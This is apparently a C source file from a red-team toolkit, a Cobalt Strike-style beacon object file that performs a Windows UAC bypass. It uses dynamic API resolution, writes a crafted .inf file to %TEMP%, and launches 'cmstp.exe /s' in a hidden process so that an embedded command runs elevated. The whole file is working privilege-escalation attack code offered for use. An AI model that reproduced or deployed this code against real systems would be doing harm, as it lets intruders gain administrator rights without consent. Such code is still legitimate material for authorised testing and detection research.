/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Black Basalt Beacon is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/

#include <windows.h>
#include "beacon.h"

// ================================
// IMPORTS DIRECTOS (solo si están en tu tabla)
// ================================
extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_CloseHandle;

// ================================
// FUNCIÓN AUX: EJECUTAR COMANDO OCULTO
// ================================
void execute_hidden_cmd(char* cmd) {
    HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    if (!hKernel32) return;

    typedef BOOL (WINAPI *CREATEPROCESSA)(LPCSTR, LPSTR, LPVOID, LPVOID, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    CREATEPROCESSA pCreateProcessA = (CREATEPROCESSA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateProcessA");
    if (!pCreateProcessA) return;

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (pCreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        typedef DWORD (WINAPI *WAITFORSINGLEOBJECT)(HANDLE, DWORD);
        WAITFORSINGLEOBJECT pWaitForSingleObject = (WAITFORSINGLEOBJECT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "WaitForSingleObject");
        if (pWaitForSingleObject) {
            pWaitForSingleObject(pi.hProcess, 10000); // Esperar 10s
        }
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hProcess);
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hThread);
    }
}

// ================================
// FUNCIÓN PRINCIPAL
// ================================
void go(char *args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Iniciando bypass UAC via SilentCleanup (fodhelper/CMSTP)...\n");

    // === Paso 1: Obtener %TEMP% ===
    HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    typedef DWORD (WINAPI *GETENVVARA)(LPCSTR, LPSTR, DWORD);
    GETENVVARA pGetEnvVarA = (GETENVVARA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "GetEnvironmentVariableA");

    char temp_path[512] = {0};
    char inf_path[512] = {0};

    if (!pGetEnvVarA || !pGetEnvVarA("TEMP", temp_path, sizeof(temp_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[UAC] No se pudo obtener %%TEMP%%\n");
        return;
    }

    // === Paso 2: Formatear ruta del .inf ===
    HMODULE hUser32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("user32.dll");
    typedef int (WINAPI *WSPRINTFA)(LPSTR, LPCSTR, ...);
    WSPRINTFA pwsprintfA = (WSPRINTFA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hUser32, "wsprintfA");
    if (!pwsprintfA) {
        BeaconPrintf(CALLBACK_ERROR, "[UAC] No se pudo resolver wsprintfA\n");
        return;
    }

    pwsprintfA(inf_path, "%s\\uac_bypass.inf", temp_path);

    // === Paso 3: Crear archivo .inf malicioso ===
    typedef HANDLE (WINAPI *CREATEFILEA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    CREATEFILEA pCreateFileA = (CREATEFILEA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateFileA");
    typedef BOOL (WINAPI *WRITEFILE)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    WRITEFILE pWriteFile = (WRITEFILE)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "WriteFile");

    if (!pCreateFileA || !pWriteFile) {
        BeaconPrintf(CALLBACK_ERROR, "[UAC] No se pudieron resolver CreateFileA/WriteFile\n");
        return;
    }

    HANDLE hFile = pCreateFileA(inf_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[UAC] No se pudo crear %s\n", inf_path);
        return;
    }

    char inf_content[] =
        "[Version]\n"
        "Signature=$chicago$\n"
        "[DefaultInstall]\n"
        "RunPostSetupCommands=Exec\n"
        "[Exec]\n"
        "cmd.exe /c whoami > \"%TEMP%\\uac_success.txt\"\n";

    DWORD written;
    pWriteFile(hFile, inf_content, strlen(inf_content), &written, NULL);
    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hFile);

    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Archivo .inf creado: %s\n", inf_path);

    // === Paso 4: Ejecutar con CMSTP (bypass UAC) ===
    char cmd[1024];
    pwsprintfA(cmd, "cmstp.exe /s \"%s\"", inf_path);
    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Ejecutando: %s\n", cmd);
    execute_hidden_cmd(cmd);

    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Comando ejecutado con privilegios elevados (si UAC fue bypassed)\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[UAC] Verifica: %s\\uac_success.txt\n", temp_path);
}
